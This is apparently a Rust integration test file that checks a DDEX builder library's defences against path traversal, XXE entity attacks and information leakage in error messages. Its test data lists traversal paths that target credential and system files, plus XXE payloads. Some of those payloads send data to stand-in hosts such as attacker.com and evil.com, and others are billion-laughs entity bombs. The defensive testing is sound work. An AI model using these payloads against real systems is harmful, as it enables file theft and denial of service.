//! Comprehensive Security Fixes Integration Test
//!
//! This test verifies that all security improvements work together correctly:
//! - Path validation prevents traversal attacks
//! - Entity classification blocks XXE attacks
//! - Error sanitization prevents information disclosure
//! - Cross-platform compatibility
//! - Performance impact is minimal

use ddex_builder::security::{
    PathValidator, PathValidationConfig, ErrorSanitizer, SanitizerConfig, 
    ErrorMode, ErrorContext, EntityClassifier, ClassifierConfig,
    create_entity, create_external_entity, create_parameter_entity,
    sanitize_io_error, sanitize_security_error
};
use std::io::{Error, ErrorKind};
use std::time::Instant;
use std::path::Path;

/// Test suite for comprehensive security integration
#[cfg(test)]
mod security_integration_tests {
    use super::*;

    #[test]
    fn test_path_validation_comprehensive() {
        println!("🛡️  Testing comprehensive path validation...");
        
        let validator = PathValidator::new();
        
        // Test cases that previously failed - should now be blocked
        let dangerous_paths = vec![
            // Directory traversal attacks
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "./../../root/.ssh/id_rsa",
            "dir/../../etc/shadow",
            
            // Encoded traversal attempts
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            // Unicode normalization attacks
            "..\u{2044}..\u{2044}etc\u{2044}passwd",
            "..\u{FF0F}..\u{FF0F}etc\u{FF0F}passwd",
            
            // Windows specific
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "\\\\?\\C:\\Windows\\System32\\config\\SAM",
            "\\\\localhost\\c$\\Windows\\System32\\config\\SAM",
            "//./C:/Windows/System32/config/SAM",
            
            // Unix specific
            "/proc/self/environ",
            "/dev/mem",
            "/etc/shadow",
            "/root/.ssh/authorized_keys",
            
            // Application config files
            ".env",
            "config/database.yml",
            "settings.json",
            ".aws/credentials",
        ];
        
        for dangerous_path in dangerous_paths {
            let result = validator.validate(dangerous_path);
            assert!(result.is_err(), 
                "Path '{}' should be blocked but was allowed", dangerous_path);
        }
        
        // Test safe paths still work
        let safe_paths = vec![
            "valid/file.xml",
            "data/music/track.mp3",
            "output/generated.xml",
            "temp/processing.json",
        ];
        
        for safe_path in safe_paths {
            let result = validator.validate(safe_path);
            assert!(result.is_ok(), 
                "Safe path '{}' should be allowed", safe_path);
        }
        
        println!("✅ Path validation comprehensive test passed");
    }

    #[test]
    fn test_entity_classification_xxe_defense() {
        println!("🛡️  Testing entity classification XXE defense...");
        
        let mut classifier = EntityClassifier::new();
        
        // Test all known XXE attack payloads
        let xxe_payloads = vec![
            // Basic external entity attacks
            create_external_entity("xxe", "file:///etc/passwd"),
            create_external_entity("xxe", "http://attacker.com/evil.dtd"),
            create_external_entity("xxe", "ftp://evil.com/exfiltrate"),
            create_external_entity("xxe", "jar:http://evil.com/evil.jar!/"),
            
            // Parameter entity attacks
            create_parameter_entity("file", "file:///etc/passwd"),
            create_parameter_entity("dtd", "http://attacker.com/evil.dtd"),
            create_parameter_entity("exfil", "http://attacker.com/exfil?data=%file;"),
            
            // Billion laughs variants
            create_entity("lol", "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"),
            create_entity("lol2", "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"),
            create_entity("lol3", "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"),
            create_entity("lol4", "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"),
            create_entity("lol5", "LOL"),
            
            // Quadratic blowup attacks
            create_entity("a", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"), // 32 a's
            create_entity("b", "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"), // 16 references = 512 a's
            create_entity("c", "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"), // 16 references = 8192 a's
        ];
        
        // All these should be detected as malicious or trigger validation errors
        for entity in xxe_payloads {
            let entities = vec![entity];
            let result = classifier.validate_entity_chain(&entities);
            
            assert!(!result.is_safe, 
                "XXE payload with entity '{}' should be blocked", entities[0].name);
            assert!(!result.errors.is_empty(), 
                "XXE payload with entity '{}' should have errors", entities[0].name);
        }
        
        // Test safe DDEX entities still work
        let safe_entities = vec![
            create_entity("title", "Song Title"),
            create_entity("artist", "Artist Name"),
            create_entity("isrc", "USRC17607839"),
            create_entity("duration", "PT3M45S"),
        ];
        
        let result = classifier.validate_entity_chain(&safe_entities);
        assert!(result.is_safe, "Safe DDEX entities should be allowed");
        assert!(result.errors.is_empty(), "Safe DDEX entities should have no errors");
        
        println!("✅ Entity classification XXE defense test passed");
    }

    #[test]
    fn test_error_sanitization_no_leakage() {
        println!("🛡️  Testing error sanitization prevents information leakage...");
        
        let config = SanitizerConfig {
            mode: ErrorMode::Production,
            generate_correlation_ids: true,
            log_internal_details: false, // Don't spam test logs
            max_message_length: 200,
            include_error_codes: true,
        };
        
        let mut sanitizer = ErrorSanitizer::with_config(config);
        
        // Test sensitive information that should be redacted
        let sensitive_errors = vec![
            (
                "File path leakage",
                Error::new(ErrorKind::PermissionDenied, "Cannot access /home/admin/secrets.txt containing API keys"),
                ErrorContext::FileRead,
                vec!["/home/admin", "secrets.txt", "API keys"],
            ),
            (
                "Network information leakage", 
                Error::new(ErrorKind::ConnectionRefused, "Connection failed to 192.168.1.100:8080 (internal server)"),
                ErrorContext::NetworkRequest,
                vec!["192.168.1.100", "8080", "internal server"],
            ),
            (
                "Memory address leakage",
                Error::new(ErrorKind::Other, "Segmentation fault at address 0x7fff5fbff000 in function parse_xml()"),
                ErrorContext::XmlParsing,
                vec!["0x7fff5fbff000", "parse_xml"],
            ),
            (
                "Database connection leakage",
                Error::new(ErrorKind::ConnectionRefused, "Failed to connect to postgres://admin:FAKE_PASSWORD_123@db.internal.com:5432/prod"),
                ErrorContext::DatabaseConnection,
                vec!["admin", "FAKE_PASSWORD_123", "db.internal.com", "5432", "prod"],
            ),
            (
                "API key leakage",
                Error::new(ErrorKind::PermissionDenied, "Authentication failed: api_key=FAKE_API_KEY_FOR_TESTING_ONLY"),
                ErrorContext::Authentication,
                vec!["FAKE_API_KEY_FOR_TESTING_ONLY"],
            ),
        ];
        
        for (test_name, error, context, sensitive_strings) in sensitive_errors {
            let sanitized = sanitizer.sanitize(error, context);
            
            // Verify no sensitive information leaked
            for sensitive_string in sensitive_strings {
                assert!(!sanitized.message.contains(sensitive_string),
                    "{}: Message should not contain '{}' but got: '{}'", 
                    test_name, sensitive_string, sanitized.message);
                assert!(!sanitized.to_string().contains(sensitive_string),
                    "{}: Full output should not contain '{}' but got: '{}'", 
                    test_name, sensitive_string, sanitized.to_string());
            }
            
            // Verify useful information is still present
            assert!(!sanitized.correlation_id.is_empty(),
                "{}: Should have correlation ID", test_name);
            assert!(sanitized.code.is_some(),
                "{}: Should have error code", test_name);
            assert!(!sanitized.message.is_empty(),
                "{}: Should have non-empty message", test_name);
        }
        
        println!("✅ Error sanitization no leakage test passed");
    }

    #[test]
    fn test_cross_platform_path_validation() {
        println!("🛡️  Testing cross-platform path validation...");
        
        let validator = PathValidator::new();
        
        // Test platform-specific attacks
        let long_path_string = "A".repeat(5000);
        let platform_attacks = vec![
            // Windows-specific
            ("Windows UNC", "\\\\evil.com\\share\\file.exe"),
            ("Windows device", "\\\\.\\pipe\\evil"),
            ("Windows alternate data stream", "file.txt:hidden.exe"),
            ("Windows reserved names", "CON.txt"),
            ("Windows drive traversal", "C:\\..\\..\\Windows\\System32\\cmd.exe"),
            
            // Unix-specific  
            ("Unix proc filesystem", "/proc/self/mem"),
            ("Unix dev filesystem", "/dev/random"),
            ("Unix home traversal", "~/../../../etc/passwd"),
            ("Unix hidden files", ".bashrc"),
            
            // macOS-specific
            ("macOS resource fork", "file.txt/..namedfork/rsrc"),
            ("macOS system path", "/System/Library/CoreServices/boot.efi"),
            ("macOS app bundle", "evil.app/Contents/MacOS/evil"),
            
            // Cross-platform
            ("Null byte injection", "safe.txt\0../../etc/passwd"),
            ("Long path attack", &long_path_string),
            ("Control character", "file\x01name.txt"),
            ("Unicode homograph", "file\u{2044}name.txt"), // Unicode slash
        ];
        
        for (attack_name, attack_path) in platform_attacks {
            let result = validator.validate(attack_path);
            assert!(result.is_err(), 
                "Platform attack '{}' with path '{}' should be blocked", 
                attack_name, attack_path);
        }
        
        println!("✅ Cross-platform path validation test passed");
    }

    #[test]
    fn test_performance_impact_benchmark() {
        println!("⚡ Testing performance impact of security improvements...");
        
        const ITERATIONS: usize = 10000;
        
        // Benchmark path validation
        let path_validation_overhead = benchmark_path_validation(ITERATIONS);
        assert!(path_validation_overhead < 0.05, // <5% overhead
            "Path validation overhead too high: {:.2}%", path_validation_overhead * 100.0);
        
        // Benchmark entity classification
        let entity_classification_overhead = benchmark_entity_classification(ITERATIONS);
        assert!(entity_classification_overhead < 0.05, // <5% overhead
            "Entity classification overhead too high: {:.2}%", entity_classification_overhead * 100.0);
        
        // Benchmark error sanitization
        let error_sanitization_overhead = benchmark_error_sanitization(ITERATIONS);
        assert!(error_sanitization_overhead < 0.05, // <5% overhead
            "Error sanitization overhead too high: {:.2}%", error_sanitization_overhead * 100.0);
        
        println!("✅ Performance impact test passed:");
        println!("  Path validation overhead: {:.2}%", path_validation_overhead * 100.0);
        println!("  Entity classification overhead: {:.2}%", entity_classification_overhead * 100.0);
        println!("  Error sanitization overhead: {:.2}%", error_sanitization_overhead * 100.0);
    }

    #[test]
    fn test_integrated_security_workflow() {
        println!("🔒 Testing integrated security workflow...");
        
        // Simulate a complete workflow with all security components
        let path_validator = PathValidator::new();
        let mut entity_classifier = EntityClassifier::new();
        let mut error_sanitizer = ErrorSanitizer::with_config(SanitizerConfig {
            mode: ErrorMode::Production,
            ..SanitizerConfig::default()
        });
        
        // Step 1: Validate file path (should fail)
        let malicious_path = "../../../etc/passwd";
        let path_result = path_validator.validate(malicious_path);
        assert!(path_result.is_err(), "Malicious path should be blocked");
        
        // Step 2: If path validation failed, sanitize the error
        let path_error = Error::new(ErrorKind::PermissionDenied, 
            format!("Path validation failed for {}: {:?}", malicious_path, path_result.err()));
        let sanitized_path_error = error_sanitizer.sanitize_security_error(path_error);
        
        // Verify no path information leaked
        assert!(!sanitized_path_error.to_string().contains("etc/passwd"),
            "Sanitized path error should not contain sensitive path");
        
        // Step 3: Validate XML entities (should fail)
        let malicious_entities = vec![
            create_external_entity("xxe", "file:///etc/passwd"),
            create_entity("bomb", "&bomb;&bomb;&bomb;&bomb;"),
        ];
        let entity_result = entity_classifier.validate_entity_chain(&malicious_entities);
        assert!(!entity_result.is_safe, "Malicious entities should be blocked");
        
        // Step 4: If entity validation failed, sanitize the error
        let entity_error = Error::new(ErrorKind::InvalidData,
            format!("Entity validation failed: {}", entity_result.errors.join(", ")));
        let sanitized_entity_error = error_sanitizer.sanitize_security_error(entity_error);
        
        // Verify no entity details leaked
        assert!(!sanitized_entity_error.to_string().contains("file:///etc/passwd"),
            "Sanitized entity error should not contain sensitive entity reference");
        
        // Step 5: Verify all errors have correlation IDs for internal debugging
        assert!(!sanitized_path_error.correlation_id.is_empty(),
            "Path error should have correlation ID");
        assert!(!sanitized_entity_error.correlation_id.is_empty(),
            "Entity error should have correlation ID");
        
        println!("✅ Integrated security workflow test passed");
    }

    #[test]
    fn test_security_edge_cases() {
        println!("🔍 Testing security edge cases...");
        
        // Test empty inputs
        let validator = PathValidator::new();
        let empty_path = validator.validate("");
        assert!(empty_path.is_err(), "Empty path should be blocked");
        
        // Test very long inputs
        let long_path = "A".repeat(10000);
        let long_path_result = validator.validate(&long_path);
        assert!(long_path_result.is_err(), "Very long path should be blocked");
        
        // Test null byte attacks
        let null_byte_path = "safe.txt\0../../etc/passwd";
        let null_result = validator.validate(null_byte_path);
        assert!(null_result.is_err(), "Null byte attack should be blocked");
        
        // Test Unicode normalization attacks
        let unicode_attack = "..\u{2044}..\u{2044}etc\u{2044}passwd";
        let unicode_result = validator.validate(unicode_attack);
        assert!(unicode_result.is_err(), "Unicode normalization attack should be blocked");
        
        // Test deeply nested entity chains
        let mut classifier = EntityClassifier::new();
        let mut deep_entities = Vec::new();
        for i in 0..100 {
            if i == 99 {
                deep_entities.push(create_entity(&format!("level{}", i), "deep"));
            } else {
                deep_entities.push(create_entity(&format!("level{}", i), &format!("&level{};", i + 1)));
            }
        }
        
        let deep_result = classifier.validate_entity_chain(&deep_entities);
        assert!(!deep_result.is_safe, "Deeply nested entities should be blocked");
        
        println!("✅ Security edge cases test passed");
    }

    // Helper functions for benchmarking
    
    fn benchmark_path_validation(iterations: usize) -> f64 {
        let paths = vec![
            "valid/path.xml",
            "another/valid/path.json", 
            "../invalid/path.txt",
            "normal/file.mp3",
        ];
        
        // Baseline: just validate paths without security
        let baseline_start = Instant::now();
        for _ in 0..iterations {
            for path in &paths {
                let _ = Path::new(path).exists(); // Simulate basic path operation
            }
        }
        let baseline_time = baseline_start.elapsed();
        
        // With security: validate paths with security checks
        let validator = PathValidator::new();
        let security_start = Instant::now();
        for _ in 0..iterations {
            for path in &paths {
                let _ = validator.validate(path);
            }
        }
        let security_time = security_start.elapsed();
        
        // Calculate overhead percentage
        let overhead = (security_time.as_nanos() as f64 - baseline_time.as_nanos() as f64) 
            / baseline_time.as_nanos() as f64;
        overhead.max(0.0) // Don't allow negative overhead
    }
    
    fn benchmark_entity_classification(iterations: usize) -> f64 {
        let entities = vec![
            create_entity("title", "Song Title"),
            create_entity("artist", "Artist Name"), 
            create_entity("isrc", "USRC17607839"),
        ];
        
        // Baseline: just process entities without classification
        let baseline_start = Instant::now();
        for _ in 0..iterations {
            for entity in &entities {
                let _ = entity.name.len() + entity.value.len(); // Simulate basic processing
            }
        }
        let baseline_time = baseline_start.elapsed();
        
        // With security: classify entities
        let mut classifier = EntityClassifier::new();
        let security_start = Instant::now();
        for _ in 0..iterations {
            let _ = classifier.validate_entity_chain(&entities);
        }
        let security_time = security_start.elapsed();
        
        // Calculate overhead percentage
        let overhead = (security_time.as_nanos() as f64 - baseline_time.as_nanos() as f64) 
            / baseline_time.as_nanos() as f64;
        overhead.max(0.0)
    }
    
    fn benchmark_error_sanitization(iterations: usize) -> f64 {
        let test_errors = vec![
            Error::new(ErrorKind::NotFound, "File not found"),
            Error::new(ErrorKind::PermissionDenied, "Permission denied"),
            Error::new(ErrorKind::InvalidData, "Invalid data"),
        ];
        
        // Baseline: just format errors without sanitization
        let baseline_start = Instant::now();
        for _ in 0..iterations {
            for error in &test_errors {
                let _ = format!("Error: {}", error); // Simulate basic error formatting
            }
        }
        let baseline_time = baseline_start.elapsed();
        
        // With security: sanitize errors
        let mut sanitizer = ErrorSanitizer::new();
        let security_start = Instant::now();
        for _ in 0..iterations {
            for error in &test_errors {
                // Clone the error since sanitize consumes it
                let cloned_error = Error::new(error.kind(), error.to_string());
                let _ = sanitizer.sanitize_io_error(cloned_error, ErrorContext::FileRead);
            }
        }
        let security_time = security_start.elapsed();
        
        // Calculate overhead percentage
        let overhead = (security_time.as_nanos() as f64 - baseline_time.as_nanos() as f64) 
            / baseline_time.as_nanos() as f64;
        overhead.max(0.0)
    }
}

/// Integration test for memory safety and resource cleanup
#[test]
fn test_security_memory_safety() {
    println!("🧠 Testing memory safety and resource cleanup...");
    
    // Test that security components don't leak memory under stress
    let mut sanitizer = ErrorSanitizer::new();
    let mut classifier = EntityClassifier::new();
    
    // Generate many errors and entities to test resource cleanup
    for i in 0..1000 {
        // Test error sanitization doesn't accumulate memory
        let error = Error::new(ErrorKind::Other, format!("Test error {}", i));
        let _ = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
        
        // Test entity classification doesn't accumulate memory
        let entity = create_entity(&format!("test{}", i), &format!("value{}", i));
        let _ = classifier.validate_entity_chain(&vec![entity]);
        
        // Periodically clear caches to simulate real usage
        if i % 100 == 0 {
            sanitizer.clear_error_store();
        }
    }
    
    println!("✅ Memory safety test passed");
}

/// Test that all security components work correctly under concurrent access
#[cfg(feature = "async")]
#[tokio::test]
async fn test_security_concurrent_access() {
    use tokio::task;
    
    println!("🔄 Testing concurrent access to security components...");
    
    let handles: Vec<_> = (0..10).map(|i| {
        task::spawn(async move {
            // Each task tests all security components
            let validator = PathValidator::new();
            let mut classifier = EntityClassifier::new();
            let mut sanitizer = ErrorSanitizer::new();
            
            // Test concurrent path validation
            let path_result = validator.validate(&format!("test/path/{}.xml", i));
            assert!(path_result.is_ok(), "Valid path should pass validation");
            
            // Test concurrent entity classification  
            let entity = create_entity(&format!("test{}", i), &format!("value{}", i));
            let entity_result = classifier.validate_entity_chain(&vec![entity]);
            assert!(entity_result.is_safe, "Valid entity should pass classification");
            
            // Test concurrent error sanitization
            let error = Error::new(ErrorKind::Other, format!("Test error {}", i));
            let sanitized = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
            assert!(!sanitized.correlation_id.is_empty(), "Should have correlation ID");
            
            i
        })
    }).collect();
    
    // Wait for all tasks to complete
    for handle in handles {
        handle.await.expect("Task should complete successfully");
    }
    
    println!("✅ Concurrent access test passed");
}

/// Test security components handle malformed/corrupted inputs gracefully
#[test]
fn test_security_malformed_input_handling() {
    println!("💥 Testing malformed input handling...");
    
    let validator = PathValidator::new();
    let mut classifier = EntityClassifier::new();
    let mut sanitizer = ErrorSanitizer::new();
    
    // Test path validator with malformed inputs
    let bom_string = "\u{FEFF}".repeat(100);
    let malformed_paths = vec![
        "\0\0\0\0", // Null bytes
        "\x01\x02\x03\x04", // Control characters
        "🔥💀☠️", // Emojis
        &bom_string, // BOM characters
    ];
    
    for path in malformed_paths {
        let result = validator.validate(path);
        // Should not panic, should handle gracefully
        assert!(result.is_err(), "Malformed path should be rejected");
    }
    
    // Test entity classifier with malformed entities
    let malformed_entities = vec![
        create_entity("", ""), // Empty
        create_entity("\0", "value"), // Null in name
        create_entity("name", "\0"), // Null in value
        create_entity(&"A".repeat(10000), "value"), // Very long name
        create_entity("name", &"A".repeat(100000)), // Very long value
    ];
    
    for entity in malformed_entities {
        let result = classifier.validate_entity_chain(&vec![entity]);
        // Should not panic, should handle gracefully
        // (May be safe or unsafe depending on content, but shouldn't crash)
        assert!(!result.errors.is_empty() || result.is_safe, 
            "Should either have errors or be safe, not crash");
    }
    
    // Test error sanitizer with malformed errors
    let long_message_string = "A".repeat(100000);
    let malformed_error_messages = vec![
        "", // Empty
        "\0\0\0", // Null bytes
        "\x01\x02\x03", // Control characters
        &long_message_string, // Very long message
    ];
    
    for msg in malformed_error_messages {
        let error = Error::new(ErrorKind::Other, msg);
        let sanitized = sanitizer.sanitize_io_error(error, ErrorContext::FileRead);
        // Should not panic, should produce valid sanitized error
        assert!(!sanitized.correlation_id.is_empty(), "Should have correlation ID");
        assert!(!sanitized.message.is_empty(), "Should have non-empty message");
    }
    
    println!("✅ Malformed input handling test passed");
}